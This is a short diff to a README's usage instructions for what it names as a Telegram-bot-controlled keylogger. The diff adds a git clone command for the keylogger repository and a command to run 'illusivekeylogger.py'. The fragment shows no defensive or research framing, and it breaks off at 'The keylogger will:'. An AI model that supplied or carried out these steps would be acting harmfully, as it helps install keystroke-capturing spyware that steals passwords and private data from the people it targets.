@@ -54,7 +54,9 @@ bash
 
 🖥️ Usage
 1. Run the script:
-   ``git clone ``
+   ``git clone https://github.com/Illusivehacks/keylogger_telegrambot-controlled.git``
+
+
    ``python illusivekeylogger.py``
 
 2. The keylogger will:
